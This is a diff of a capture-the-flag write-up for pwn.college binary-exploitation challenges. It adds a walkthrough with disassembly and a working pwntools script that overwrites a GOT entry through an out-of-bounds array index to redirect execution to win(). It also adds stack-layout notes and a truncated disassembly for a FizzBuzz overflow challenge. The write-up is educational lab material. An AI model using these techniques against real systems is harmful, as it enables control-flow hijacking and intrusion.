@@ -4621,6 +4621,396 @@ Index -78: Found 'zW}\n\x00\x00\x00\x00'
 
 &nbsp;
 
+## Now you got it (Easy)
+
+```
+hacker@program-security~now-you-got-it-easy:~$ /challenge/now-you-got-it-easy 
+The challenge() function has just been launched!
+This challenge has an array of cool hacker numbers in the bss, which you can overwrite by providing an index.
+The array starts at 0x58ca2efeb100, and is 760 bytes long.
+
+The GOT (global offset table) is located at  0x58ca2efea000
+FREE LEAK: win is located at: 0x58ca2efe73b5
+
+Which number would you like to view? 0
+You have selected index 0, which is 0 bytes into the array.
+Your hacker number is ffffffffdeadbeef
+What number would you like to replace it with? 12
+The program's memory status:
+- the array starts at 0x7ffe23515810
+Your hacker number is 0
+- the address of win() is 0x58ca2efe73b5.
+
+Goodbye!
+```
+
+```
+hacker@program-security~now-you-got-it-easy:~$ checksec /challenge/now-you-got-it-easy 
+[*] '/challenge/now-you-got-it-easy'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+Since this challenge has only `Partial RELRO` enabled, we can perform a GOT overwrite.
+
+We have to replace the GOT entry of some library, with the address of `win()`.
+
+
+### Binary Analysis
+
+```
+pwndbg> info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000001000  _init
+0x0000000000001100  __cxa_finalize@plt
+0x0000000000001110  putchar@plt
+0x0000000000001120  __errno_location@plt
+0x0000000000001130  puts@plt
+0x0000000000001140  write@plt
+0x0000000000001150  __stack_chk_fail@plt
+0x0000000000001160  printf@plt
+0x0000000000001170  geteuid@plt
+0x0000000000001180  read@plt
+0x0000000000001190  setvbuf@plt
+0x00000000000011a0  open@plt
+0x00000000000011b0  __isoc99_scanf@plt
+0x00000000000011c0  exit@plt
+0x00000000000011d0  strerror@plt
+0x00000000000011e0  _start
+0x0000000000001210  deregister_tm_clones
+0x0000000000001240  register_tm_clones
+0x0000000000001280  __do_global_dtors_aux
+0x00000000000012c0  frame_dummy
+0x00000000000012c9  DUMP_STACK
+0x00000000000014cc  bin_padding
+0x00000000000023b5  win
+0x00000000000024bc  challenge
+0x0000000000002861  main
+0x0000000000002920  __libc_csu_init
+0x0000000000002990  __libc_csu_fini
+0x0000000000002998  _fini
+```
+
+Let's look at the GOT.
+
+#### GOT
+
+```
+pwndbg> got
+Filtering out read-only entries (display them with -r or --show-readonly)
+
+State of the GOT of /challenge/now-you-got-it-easy:
+GOT protection: Partial RELRO | Found 13 GOT entries passing the filter
+[0x5f323b70c018] putchar@GLIBC_2.2.5 -> 0x5f323b708030 ◂— endbr64 
+[0x5f323b70c020] __errno_location@GLIBC_2.2.5 -> 0x5f323b708040 ◂— endbr64 
+[0x5f323b70c028] puts@GLIBC_2.2.5 -> 0x5f323b708050 ◂— endbr64 
+[0x5f323b70c030] write@GLIBC_2.2.5 -> 0x5f323b708060 ◂— endbr64 
+[0x5f323b70c038] __stack_chk_fail@GLIBC_2.4 -> 0x5f323b708070 ◂— endbr64 
+[0x5f323b70c040] printf@GLIBC_2.2.5 -> 0x5f323b708080 ◂— endbr64 
+[0x5f323b70c048] geteuid@GLIBC_2.2.5 -> 0x5f323b708090 ◂— endbr64 
+[0x5f323b70c050] read@GLIBC_2.2.5 -> 0x5f323b7080a0 ◂— endbr64 
+[0x5f323b70c058] setvbuf@GLIBC_2.2.5 -> 0x5f323b7080b0 ◂— endbr64 
+[0x5f323b70c060] open@GLIBC_2.2.5 -> 0x5f323b7080c0 ◂— endbr64 
+[0x5f323b70c068] __isoc99_scanf@GLIBC_2.7 -> 0x5f323b7080d0 ◂— endbr64 
+[0x5f323b70c070] exit@GLIBC_2.2.5 -> 0x5f323b7080e0 ◂— endbr64 
+[0x5f323b70c078] strerror@GLIBC_2.2.5 -> 0x5f323b7080f0 ◂— endbr64 
+```
+
+The GOT is always `0x1000` algined at the start of the page, so the address of the the GOT here is `0x5f323b70c000`. This tells us the offset of each of the entries within the GOT.
+
+Let's look at `challenge()` to see which functions it is calling, and thus figure out which GOT entry we should overwrite.
+
+#### `challenge()`
+
+```
+pwndbg> disassemble challenge
+Dump of assembler code for function challenge:
+   0x00005f323b7094bc <+0>:     endbr64
+   0x00005f323b7094c0 <+4>:     push   rbp
+   0x00005f323b7094c1 <+5>:     mov    rbp,rsp
+   0x00005f323b7094c4 <+8>:     sub    rsp,0xf0
+   0x00005f323b7094cb <+15>:    mov    DWORD PTR [rbp-0xd4],edi
+   0x00005f323b7094d1 <+21>:    mov    QWORD PTR [rbp-0xe0],rsi
+   0x00005f323b7094d8 <+28>:    mov    QWORD PTR [rbp-0xe8],rdx
+   0x00005f323b7094df <+35>:    mov    rax,QWORD PTR fs:0x28
+   0x00005f323b7094e8 <+44>:    mov    QWORD PTR [rbp-0x8],rax
+   0x00005f323b7094ec <+48>:    xor    eax,eax
+   0x00005f323b7094ee <+50>:    mov    QWORD PTR [rbp-0x70],0x0
+   0x00005f323b7094f6 <+58>:    mov    QWORD PTR [rbp-0x68],0x0
+   0x00005f323b7094fe <+66>:    mov    QWORD PTR [rbp-0x60],0x0
+   0x00005f323b709506 <+74>:    mov    QWORD PTR [rbp-0x58],0x0
+   0x00005f323b70950e <+82>:    mov    QWORD PTR [rbp-0x50],0x0
+   0x00005f323b709516 <+90>:    mov    QWORD PTR [rbp-0x48],0x0
+   0x00005f323b70951e <+98>:    mov    QWORD PTR [rbp-0x40],0x0
+   0x00005f323b709526 <+106>:   mov    QWORD PTR [rbp-0x38],0x0
+   0x00005f323b70952e <+114>:   mov    QWORD PTR [rbp-0x30],0x0
+   0x00005f323b709536 <+122>:   mov    QWORD PTR [rbp-0x28],0x0
+   0x00005f323b70953e <+130>:   mov    QWORD PTR [rbp-0x20],0x0
+   0x00005f323b709546 <+138>:   mov    DWORD PTR [rbp-0x18],0x0
+   0x00005f323b70954d <+145>:   mov    WORD PTR [rbp-0x14],0x0
+   0x00005f323b709553 <+151>:   mov    BYTE PTR [rbp-0x12],0x0
+   0x00005f323b709557 <+155>:   mov    QWORD PTR [rbp-0xc8],0x0
+   0x00005f323b709562 <+166>:   lea    rdi,[rip+0xc8f]        # 0x5f323b70a1f8
+   0x00005f323b709569 <+173>:   call   0x5f323b708130 <puts@plt>
+   0x00005f323b70956e <+178>:   mov    QWORD PTR [rbp-0xc8],0x1000
+   0x00005f323b709579 <+189>:   mov    DWORD PTR [rbp-0xc0],0xdeadbeef
+   0x00005f323b709583 <+199>:   mov    DWORD PTR [rbp-0xbc],0x1337c0de
+   0x00005f323b70958d <+209>:   mov    DWORD PTR [rbp-0xb8],0xfaceb00c
+   0x00005f323b709597 <+219>:   mov    DWORD PTR [rbp-0xb4],0xfeedface
+   0x00005f323b7095a1 <+229>:   mov    DWORD PTR [rbp-0xb0],0x8badf00d
+   0x00005f323b7095ab <+239>:   mov    DWORD PTR [rbp-0xac],0x1337
+   0x00005f323b7095b5 <+249>:   mov    DWORD PTR [rbp-0xa8],0xc0ffee
+   0x00005f323b7095bf <+259>:   mov    DWORD PTR [rbp-0xa4],0xf00dbeef
+   0x00005f323b7095c9 <+269>:   mov    DWORD PTR [rbp-0xa0],0x1337beef
+   0x00005f323b7095d3 <+279>:   mov    DWORD PTR [rbp-0x9c],0xb00cdead
+   0x00005f323b7095dd <+289>:   mov    DWORD PTR [rbp-0x98],0xface1337
+   0x00005f323b7095e7 <+299>:   mov    DWORD PTR [rbp-0x94],0xcafebabe
+   0x00005f323b7095f1 <+309>:   mov    DWORD PTR [rbp-0x90],0xbaadf00d
+   0x00005f323b7095fb <+319>:   mov    DWORD PTR [rbp-0x8c],0x600d1dea
+   0x00005f323b709605 <+329>:   mov    DWORD PTR [rbp-0x88],0xbadc0de
+   0x00005f323b70960f <+339>:   mov    DWORD PTR [rbp-0x84],0xdead10cc
+   0x00005f323b709619 <+349>:   mov    DWORD PTR [rbp-0x80],0xbadcab1e
+   0x00005f323b709620 <+356>:   mov    DWORD PTR [rbp-0x7c],0xddba11
+   0x00005f323b709627 <+363>:   mov    DWORD PTR [rbp-0xcc],0x0
+   0x00005f323b709631 <+373>:   jmp    0x5f323b709696 <challenge+474>
+   0x00005f323b709633 <+375>:   mov    eax,DWORD PTR [rbp-0xcc]
+   0x00005f323b709639 <+381>:   movsxd rcx,eax
+   0x00005f323b70963c <+384>:   movabs rdx,0xe38e38e38e38e38f
+   0x00005f323b709646 <+394>:   mov    rax,rcx
+   0x00005f323b709649 <+397>:   mul    rdx
+   0x00005f323b70964c <+400>:   shr    rdx,0x4
+   0x00005f323b709650 <+404>:   mov    rax,rdx
+   0x00005f323b709653 <+407>:   shl    rax,0x3
+   0x00005f323b709657 <+411>:   add    rax,rdx
+   0x00005f323b70965a <+414>:   add    rax,rax
+   0x00005f323b70965d <+417>:   sub    rcx,rax
+   0x00005f323b709660 <+420>:   mov    rdx,rcx
+   0x00005f323b709663 <+423>:   mov    eax,DWORD PTR [rbp+rdx*4-0xc0]
+   0x00005f323b70966a <+430>:   cdqe
+   0x00005f323b70966c <+432>:   mov    edx,DWORD PTR [rbp-0xcc]
+   0x00005f323b709672 <+438>:   movsxd rdx,edx
+   0x00005f323b709675 <+441>:   add    rdx,0x1dc
+   0x00005f323b70967c <+448>:   lea    rcx,[rdx*8+0x0]
+   0x00005f323b709684 <+456>:   lea    rdx,[rip+0x2b95]        # 0x5f323b70c220 <bssdata>
+   0x00005f323b70968b <+463>:   mov    QWORD PTR [rcx+rdx*1],rax
+   0x00005f323b70968f <+467>:   add    DWORD PTR [rbp-0xcc],0x1
+   0x00005f323b709696 <+474>:   cmp    DWORD PTR [rbp-0xcc],0x5e
+   0x00005f323b70969d <+481>:   jle    0x5f323b709633 <challenge+375>
+   0x00005f323b70969f <+483>:   lea    rdi,[rip+0xb8a]        # 0x5f323b70a230
+   0x00005f323b7096a6 <+490>:   call   0x5f323b708130 <puts@plt>
+   0x00005f323b7096ab <+495>:   mov    edx,0x2f8
+   0x00005f323b7096b0 <+500>:   lea    rsi,[rip+0x3a49]        # 0x5f323b70d100 <bssdata+3808>
+   0x00005f323b7096b7 <+507>:   lea    rdi,[rip+0xbe2]        # 0x5f323b70a2a0
+   0x00005f323b7096be <+514>:   mov    eax,0x0
+   0x00005f323b7096c3 <+519>:   call   0x5f323b708160 <printf@plt>
+   0x00005f323b7096c8 <+524>:   lea    rsi,[rip+0x2931]        # 0x5f323b70c000
+   0x00005f323b7096cf <+531>:   lea    rdi,[rip+0xbfa]        # 0x5f323b70a2d0
+   0x00005f323b7096d6 <+538>:   mov    eax,0x0
+   0x00005f323b7096db <+543>:   call   0x5f323b708160 <printf@plt>
+   0x00005f323b7096e0 <+548>:   lea    rsi,[rip+0xfffffffffffffcce]        # 0x5f323b7093b5 <win>
+   0x00005f323b7096e7 <+555>:   lea    rdi,[rip+0xc1a]        # 0x5f323b70a308
+   0x00005f323b7096ee <+562>:   mov    eax,0x0
+   0x00005f323b7096f3 <+567>:   call   0x5f323b708160 <printf@plt>
+   0x00005f323b7096f8 <+572>:   mov    DWORD PTR [rbp-0xd0],0x0
+   0x00005f323b709702 <+582>:   lea    rdi,[rip+0xc27]        # 0x5f323b70a330
+   0x00005f323b709709 <+589>:   mov    eax,0x0
+   0x00005f323b70970e <+594>:   call   0x5f323b708160 <printf@plt>
+   0x00005f323b709713 <+599>:   lea    rax,[rbp-0xd0]
+   0x00005f323b70971a <+606>:   mov    rsi,rax
+   0x00005f323b70971d <+609>:   lea    rdi,[rip+0xc32]        # 0x5f323b70a356
+   0x00005f323b709724 <+616>:   mov    eax,0x0
+   0x00005f323b709729 <+621>:   call   0x5f323b7081b0 <__isoc99_scanf@plt>
+   0x00005f323b70972e <+626>:   mov    eax,DWORD PTR [rbp-0xd0]
+   0x00005f323b709734 <+632>:   cdqe
+   0x00005f323b709736 <+634>:   lea    rdx,[rax*8+0x0]
+   0x00005f323b70973e <+642>:   mov    eax,DWORD PTR [rbp-0xd0]
+   0x00005f323b709744 <+648>:   mov    esi,eax
+   0x00005f323b709746 <+650>:   lea    rdi,[rip+0xc13]        # 0x5f323b70a360
+   0x00005f323b70974d <+657>:   mov    eax,0x0
+   0x00005f323b709752 <+662>:   call   0x5f323b708160 <printf@plt>
+   0x00005f323b709757 <+667>:   mov    eax,DWORD PTR [rbp-0xd0]
+   0x00005f323b70975d <+673>:   cdqe
+   0x00005f323b70975f <+675>:   add    rax,0x1dc
+   0x00005f323b709765 <+681>:   lea    rdx,[rax*8+0x0]
+   0x00005f323b70976d <+689>:   lea    rax,[rip+0x2aac]        # 0x5f323b70c220 <bssdata>
+   0x00005f323b709774 <+696>:   mov    rax,QWORD PTR [rdx+rax*1]
+   0x00005f323b709778 <+700>:   mov    rsi,rax
+   0x00005f323b70977b <+703>:   lea    rdi,[rip+0xc1d]        # 0x5f323b70a39f
+   0x00005f323b709782 <+710>:   mov    eax,0x0
+   0x00005f323b709787 <+715>:   call   0x5f323b708160 <printf@plt>
+   0x00005f323b70978c <+720>:   lea    rdi,[rip+0xc2d]        # 0x5f323b70a3c0
+   0x00005f323b709793 <+727>:   mov    eax,0x0
+   0x00005f323b709798 <+732>:   call   0x5f323b708160 <printf@plt>
+   0x00005f323b70979d <+737>:   mov    eax,DWORD PTR [rbp-0xd0]
+   0x00005f323b7097a3 <+743>:   cdqe
+   0x00005f323b7097a5 <+745>:   add    rax,0x1dc
+   0x00005f323b7097ab <+751>:   lea    rdx,[rax*8+0x0]
+   0x00005f323b7097b3 <+759>:   lea    rax,[rip+0x2a66]        # 0x5f323b70c220 <bssdata>
+   0x00005f323b7097ba <+766>:   add    rax,rdx
+   0x00005f323b7097bd <+769>:   mov    rsi,rax
+   0x00005f323b7097c0 <+772>:   lea    rdi,[rip+0xc29]        # 0x5f323b70a3f0
+   0x00005f323b7097c7 <+779>:   mov    eax,0x0
+   0x00005f323b7097cc <+784>:   call   0x5f323b7081b0 <__isoc99_scanf@plt>
+   0x00005f323b7097d1 <+789>:   lea    rdi,[rip+0xc1d]        # 0x5f323b70a3f5
+   0x00005f323b7097d8 <+796>:   call   0x5f323b708130 <puts@plt>
+   0x00005f323b7097dd <+801>:   lea    rax,[rbp-0x70]
+   0x00005f323b7097e1 <+805>:   mov    rsi,rax
+   0x00005f323b7097e4 <+808>:   lea    rdi,[rip+0xc27]        # 0x5f323b70a412
+   0x00005f323b7097eb <+815>:   mov    eax,0x0
+   0x00005f323b7097f0 <+820>:   call   0x5f323b708160 <printf@plt>
+   0x00005f323b7097f5 <+825>:   mov    eax,DWORD PTR [rbp-0xd0]
+   0x00005f323b7097fb <+831>:   cdqe
+   0x00005f323b7097fd <+833>:   movzx  eax,BYTE PTR [rbp+rax*1-0x70]
+   0x00005f323b709802 <+838>:   movsx  eax,al
+   0x00005f323b709805 <+841>:   mov    esi,eax
+   0x00005f323b709807 <+843>:   lea    rdi,[rip+0xb91]        # 0x5f323b70a39f
+   0x00005f323b70980e <+850>:   mov    eax,0x0
+   0x00005f323b709813 <+855>:   call   0x5f323b708160 <printf@plt>
+   0x00005f323b709818 <+860>:   lea    rsi,[rip+0xfffffffffffffb96]        # 0x5f323b7093b5 <win>
+   0x00005f323b70981f <+867>:   lea    rdi,[rip+0xc0a]        # 0x5f323b70a430
+   0x00005f323b709826 <+874>:   mov    eax,0x0
+   0x00005f323b70982b <+879>:   call   0x5f323b708160 <printf@plt>
+   0x00005f323b709830 <+884>:   mov    edi,0xa
+   0x00005f323b709835 <+889>:   call   0x5f323b708110 <putchar@plt>
+   0x00005f323b70983a <+894>:   lea    rdi,[rip+0xc0e]        # 0x5f323b70a44f
+   0x00005f323b709841 <+901>:   call   0x5f323b708130 <puts@plt>
+   0x00005f323b709846 <+906>:   mov    eax,0x0
+   0x00005f323b70984b <+911>:   mov    rcx,QWORD PTR [rbp-0x8]
+   0x00005f323b70984f <+915>:   xor    rcx,QWORD PTR fs:0x28
+   0x00005f323b709858 <+924>:   je     0x5f323b70985f <challenge+931>
+   0x00005f323b70985a <+926>:   call   0x5f323b708150 <__stack_chk_fail@plt>
+   0x00005f323b70985f <+931>:   leave
+   0x00005f323b709860 <+932>:   ret
+End of assembler dump.
+```
+
+We can see that after it takes our input, it calls `putchar@plt` at `challenge+889`.
+Before we overwrite the GOT entry of `putchar@plt` let's see if `win()` is using this function, as we do not want to break any functionality in `win()`.
+
+#### `win()`
+
+```
+pwndbg> disassemble win
+Dump of assembler code for function win:
+   0x00005f323b7093b5 <+0>:     endbr64
+   0x00005f323b7093b9 <+4>:     push   rbp
+   0x00005f323b7093ba <+5>:     mov    rbp,rsp
+   0x00005f323b7093bd <+8>:     lea    rdi,[rip+0xd2c]        # 0x5f323b70a0f0
+   0x00005f323b7093c4 <+15>:    call   0x5f323b708130 <puts@plt>
+   0x00005f323b7093c9 <+20>:    mov    esi,0x0
+   0x00005f323b7093ce <+25>:    lea    rdi,[rip+0xd37]        # 0x5f323b70a10c
+   0x00005f323b7093d5 <+32>:    mov    eax,0x0
+   0x00005f323b7093da <+37>:    call   0x5f323b7081a0 <open@plt>
+   0x00005f323b7093df <+42>:    mov    DWORD PTR [rip+0x2cdb],eax        # 0x5f323b70c0c0 <flag_fd.5714>
+   0x00005f323b7093e5 <+48>:    mov    eax,DWORD PTR [rip+0x2cd5]        # 0x5f323b70c0c0 <flag_fd.5714>
+   0x00005f323b7093eb <+54>:    test   eax,eax
+   0x00005f323b7093ed <+56>:    jns    0x5f323b70943c <win+135>
+   0x00005f323b7093ef <+58>:    call   0x5f323b708120 <__errno_location@plt>
+   0x00005f323b7093f4 <+63>:    mov    eax,DWORD PTR [rax]
+   0x00005f323b7093f6 <+65>:    mov    edi,eax
+   0x00005f323b7093f8 <+67>:    call   0x5f323b7081d0 <strerror@plt>
+   0x00005f323b7093fd <+72>:    mov    rsi,rax
+   0x00005f323b709400 <+75>:    lea    rdi,[rip+0xd11]        # 0x5f323b70a118
+   0x00005f323b709407 <+82>:    mov    eax,0x0
+   0x00005f323b70940c <+87>:    call   0x5f323b708160 <printf@plt>
+   0x00005f323b709411 <+92>:    call   0x5f323b708170 <geteuid@plt>
+   0x00005f323b709416 <+97>:    test   eax,eax
+   0x00005f323b709418 <+99>:    je     0x5f323b709432 <win+125>
+   0x00005f323b70941a <+101>:   lea    rdi,[rip+0xd27]        # 0x5f323b70a148
+   0x00005f323b709421 <+108>:   call   0x5f323b708130 <puts@plt>
+   0x00005f323b709426 <+113>:   lea    rdi,[rip+0xd43]        # 0x5f323b70a170
+   0x00005f323b70942d <+120>:   call   0x5f323b708130 <puts@plt>
+   0x00005f323b709432 <+125>:   mov    edi,0xffffffff
+   0x00005f323b709437 <+130>:   call   0x5f323b7081c0 <exit@plt>
+   0x00005f323b70943c <+135>:   mov    eax,DWORD PTR [rip+0x2c7e]        # 0x5f323b70c0c0 <flag_fd.5714>
+   0x00005f323b709442 <+141>:   mov    edx,0x100
+   0x00005f323b709447 <+146>:   lea    rsi,[rip+0x2c92]        # 0x5f323b70c0e0 <flag.5713>
+   0x00005f323b70944e <+153>:   mov    edi,eax
+   0x00005f323b709450 <+155>:   call   0x5f323b708180 <read@plt>
+   0x00005f323b709455 <+160>:   mov    DWORD PTR [rip+0x2d85],eax        # 0x5f323b70c1e0 <flag_length.5715>
+   0x00005f323b70945b <+166>:   mov    eax,DWORD PTR [rip+0x2d7f]        # 0x5f323b70c1e0 <flag_length.5715>
+   0x00005f323b709461 <+172>:   test   eax,eax
+   0x00005f323b709463 <+174>:   jg     0x5f323b709491 <win+220>
+   0x00005f323b709465 <+176>:   call   0x5f323b708120 <__errno_location@plt>
+   0x00005f323b70946a <+181>:   mov    eax,DWORD PTR [rax]
+   0x00005f323b70946c <+183>:   mov    edi,eax
+   0x00005f323b70946e <+185>:   call   0x5f323b7081d0 <strerror@plt>
+   0x00005f323b709473 <+190>:   mov    rsi,rax
+   0x00005f323b709476 <+193>:   lea    rdi,[rip+0xd4b]        # 0x5f323b70a1c8
+   0x00005f323b70947d <+200>:   mov    eax,0x0
+   0x00005f323b709482 <+205>:   call   0x5f323b708160 <printf@plt>
+   0x00005f323b709487 <+210>:   mov    edi,0xffffffff
+   0x00005f323b70948c <+215>:   call   0x5f323b7081c0 <exit@plt>
+   0x00005f323b709491 <+220>:   mov    eax,DWORD PTR [rip+0x2d49]        # 0x5f323b70c1e0 <flag_length.5715>
+   0x00005f323b709497 <+226>:   cdqe
+   0x00005f323b709499 <+228>:   mov    rdx,rax
+   0x00005f323b70949c <+231>:   lea    rsi,[rip+0x2c3d]        # 0x5f323b70c0e0 <flag.5713>
+   0x00005f323b7094a3 <+238>:   mov    edi,0x1
+   0x00005f323b7094a8 <+243>:   call   0x5f323b708140 <write@plt>
+   0x00005f323b7094ad <+248>:   lea    rdi,[rip+0xd3e]        # 0x5f323b70a1f2
+   0x00005f323b7094b4 <+255>:   call   0x5f323b708130 <puts@plt>
+   0x00005f323b7094b9 <+260>:   nop
+   0x00005f323b7094ba <+261>:   pop    rbp
+   0x00005f323b7094bb <+262>:   ret
+End of assembler dump.
+```
+
+Since `win()` is not calling `putchar@plt` we are good to go.
+The offset of the `putchar` entry within the GOT is `0x18`. So whatever index we use (it will be negative), we have to add `0x18` to it.
+
+### Exploit
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+p = process('/challenge/now-you-got-it-easy')
+
+p.recvuntil(b"The array starts at ")
+array_start = int(p.recvuntil(b",", drop=True), 16)
+
+p.recvuntil(b"The GOT (global offset table) is located at  ")
+got_base = int(p.recvline().strip(), 16)
+
+p.recvuntil(b"FREE LEAK: win is located at: ")
+win_addr = int(p.recvline().strip(), 16)
+
+target_addr = got_base + 0x18
+index = (target_addr - array_start) // 8
+
+p.sendlineafter(b"view?", str(index).encode())
+p.sendlineafter(b"with?", str(win_addr).encode())
+
+p.interactive()
+```
+
+```
+hacker@program-security~now-you-got-it-easy:~$ python ~/script.py
+[+] Starting local process '/challenge/now-you-got-it-easy': pid 72035
+[*] Switching to interactive mode
+ [*] Process '/challenge/now-you-got-it-easy' stopped with exit code 0 (pid 72035)
+The program's memory status:
+- the array starts at 0x7ffe2c374ee0
+Your hacker number is 0
+- the address of win() is 0x5b00f632e3b5.
+You win! Here is your flag:
+pwn.college{U4yJ6TY7r_VV0p6Zr6w-rMA0qHi.QX2gzN4EDL4ITM0EzW}
+
+
+Goodbye!
+[*] Got EOF while reading in interactive
+$ 
+```
+
+&nbsp;
+
 ## Loop Lunacy (Easy)
 
 ```
@@ -12207,7 +12597,7 @@ pwn.college{UJWC1yJUHtA7uU-qswdUXIYxtrv.0VNyMDL4ITM0EzW}
 
 &nbsp;
 
-## Crafty Clobber (Hard)
+## A Crafty Clobber (Hard)
 
 ```
 hacker@program-security~a-crafty-clobber-hard:~$ /challenge/crafty-clobber-hard 
@@ -12925,6 +13315,18 @@ pwn.college{EQf_cMvGimapk5C6wtgB4JrjY1M.0lNyMDL4ITM0EzW}
 
 ## Can it Fizz?
 
+Index,Offset,Decompiler Reference,Purpose
+buf[0],+0x00,LODWORD(buf[0]),Loop Limit: Set to 16.
+buf[1],+0x08,-,Unused/Padding.
+
+buf[2],+0x10,(char *)&buf[2] + 4,Input Buffer Start: This is where your read() input begins (specifically at offset +0x14).
+buf[3-8],+0x18-40,-,Overflow Zone: Your input from read() spills into these indices.
+buf[9],+0x48,(char *)&buf[9] + 4,"Local ""Buzz"" String: The string ""Buzz\n"" is stored here at offset +0x4C."
+buf[10],+0x50,HIDWORD(buf[10]),Loop Counter (i): Stored in the upper 4 bytes (offset +0x54).
+buf[11],+0x58,buf[11],"Answer Pointer: Stores the address of ""fizz"", ""Buzz"", or ""fuzzbuzz""."
+buf[12],+0x60,buf[12],Destination Pointer: The address where strcpy will write the answer.
+buf[13],+0x68,-,End of the allocated buffer array.
+
 ```
 hacker@program-security~can-it-fizz:~$ ls /challenge/
 can-it-fizz
@@ -12975,50 +13377,186 @@ We see that `main()` calls `challenge()`.
 __int64 challenge()
 {
   __int64 result; // rax
-  char *buffer[14]; // [rsp+20h] [rbp-70h] BYREF
+  char *buf[14]; // [rsp+20h] [rbp-70h] BYREF
 
   memset(buffer, 0, 0x68uLL);
-  buffer[12] = (char *)buffer + 4;
-  buffer[11] = (char *)&buffer[2] + 4;
-  HIDWORD(buffer[10]) = 0;
-  LODWORD(buffer[0]) = 16;
-  strcpy((char *)&buffer[9] + 4, "Buzz\n");
+  buf[12] = (char *)buffer + 4;
+  buf[11] = (char *)&buf[2] + 4;
+  HIDWORD(buf[10]) = 0;
+  LODWORD(buf[0]) = 16;
+  strcpy((char *)&buf[9] + 4, "Buzz\n");
   puts("Welcome to Fizz Buzz!");
-  for ( HIDWORD(buffer[10]) = 0; ; ++HIDWORD(buffer[10]) )
+  for ( HIDWORD(buf[10]) = 0; ; ++HIDWORD(buf[10]) )
   {
-    result = LODWORD(buffer[0]);
-    if ( SHIDWORD(buffer[10]) >= SLODWORD(buffer[0]) )
+    result = LODWORD(buf[0]);
+    if ( SHIDWORD(buf[10]) >= SLODWORD(buf[0]) )
       break;
-    if ( SHIDWORD(buffer[10]) % 15 )
+    if ( SHIDWORD(buf[10]) % 15 )
     {
-      if ( SHIDWORD(buffer[10]) % 3 )
+      if ( SHIDWORD(buf[10]) % 3 )
       {
-        if ( SHIDWORD(buffer[10]) % 5 )
-          buffer[11] = (char *)&nothing;
+        if ( SHIDWORD(buf[10]) % 5 )
+          buf[11] = (char *)&nothing;
         else
-          buffer[11] = (char *)&buffer[9] + 4;
+          buf[11] = (char *)&buf[9] + 4;
       }
       else
       {
-        buffer[11] = fizz;
+        buf[11] = fizz;
       }
     }
     else
     {
-      buffer[11] = (char *)&fuzzbuzz;
+      buf[11] = (char *)&fuzzbuzz;
     }
-    printf("%d: ", HIDWORD(buffer[10]));
-    read(0, (char *)&buffer[2] + 4, 0x100uLL);
-    printf("You entered: %s\n", (const char *)&buffer[2] + 4);
-    BYTE4(buffer[2]) = 0;
-    strcpy(buffer[12], buffer[11]);
-    printf("Correct answer: %s\n", buffer[12]);
+    printf("%d: ", HIDWORD(buf[10]));
+    read(0, (char *)&buf[2] + 4, 0x100uLL);
+    printf("You entered: %s\n", (const char *)&buf[2] + 4);
+    BYTE4(buf[2]) = 0;
+    strcpy(buf[12], buf[11]);
+    printf("Correct answer: %s\n", buf[12]);
   }
   return result;
 }
 ```
 
 Let's open the program in GDB.
+
+```
+pwndbg> disass challenge 
+Dump of assembler code for function challenge:
+   0x00000000000011e9 <+0>:     endbr64
+   0x00000000000011ed <+4>:     push   rbp
+   0x00000000000011ee <+5>:     mov    rbp,rsp
+   0x00000000000011f1 <+8>:     sub    rsp,0x90
+   0x00000000000011f8 <+15>:    mov    DWORD PTR [rbp-0x74],edi
+   0x00000000000011fb <+18>:    mov    QWORD PTR [rbp-0x80],rsi
+   0x00000000000011ff <+22>:    mov    QWORD PTR [rbp-0x88],rdx
+   0x0000000000001206 <+29>:    lea    rdx,[rbp-0x70]
+   0x000000000000120a <+33>:    mov    eax,0x0
+   0x000000000000120f <+38>:    mov    ecx,0xd
+   0x0000000000001214 <+43>:    mov    rdi,rdx
+   0x0000000000001217 <+46>:    rep stos QWORD PTR es:[rdi],rax
+   0x000000000000121a <+49>:    lea    rax,[rbp-0x70]
+   0x000000000000121e <+53>:    add    rax,0x4
+   0x0000000000001222 <+57>:    mov    QWORD PTR [rbp-0x10],rax
+   0x0000000000001226 <+61>:    lea    rax,[rbp-0x70]
+   0x000000000000122a <+65>:    add    rax,0x14
+   0x000000000000122e <+69>:    mov    QWORD PTR [rbp-0x18],rax
+   0x0000000000001232 <+73>:    mov    DWORD PTR [rbp-0x1c],0x0
+   0x0000000000001239 <+80>:    mov    DWORD PTR [rbp-0x70],0x10
+   0x0000000000001240 <+87>:    lea    rax,[rbp-0x70]
+   0x0000000000001244 <+91>:    add    rax,0x4c
+   0x0000000000001248 <+95>:    mov    DWORD PTR [rax],0x7a7a7542
+   0x000000000000124e <+101>:   mov    WORD PTR [rax+0x4],0xa
+   0x0000000000001254 <+107>:   lea    rdi,[rip+0xda9]        # 0x2004
+   0x000000000000125b <+114>:   call   0x10c0 <puts@plt>
+   0x0000000000001260 <+119>:   mov    DWORD PTR [rbp-0x1c],0x0
+   0x0000000000001267 <+126>:   jmp    0x13b0 <challenge+455>
+   0x000000000000126c <+131>:   mov    edx,DWORD PTR [rbp-0x1c]
+   0x000000000000126f <+134>:   movsxd rax,edx
+   0x0000000000001272 <+137>:   imul   rax,rax,0xffffffff88888889
+   0x0000000000001279 <+144>:   shr    rax,0x20
+   0x000000000000127d <+148>:   add    eax,edx
+   0x000000000000127f <+150>:   sar    eax,0x3
+   0x0000000000001282 <+153>:   mov    ecx,eax
+   0x0000000000001284 <+155>:   mov    eax,edx
+   0x0000000000001286 <+157>:   sar    eax,0x1f
+   0x0000000000001289 <+160>:   sub    ecx,eax
+   0x000000000000128b <+162>:   mov    eax,ecx
+   0x000000000000128d <+164>:   mov    ecx,eax
+   0x000000000000128f <+166>:   shl    ecx,0x4
+   0x0000000000001292 <+169>:   sub    ecx,eax
+   0x0000000000001294 <+171>:   mov    eax,edx
+   0x0000000000001296 <+173>:   sub    eax,ecx
+   0x0000000000001298 <+175>:   test   eax,eax
+   0x000000000000129a <+177>:   jne    0x12ac <challenge+195>
+   0x000000000000129c <+179>:   lea    rax,[rip+0x2d75]        # 0x4018 <fuzzbuzz>
+   0x00000000000012a3 <+186>:   mov    QWORD PTR [rbp-0x18],rax
+   0x00000000000012a7 <+190>:   jmp    0x132c <challenge+323>
+   0x00000000000012ac <+195>:   mov    ecx,DWORD PTR [rbp-0x1c]
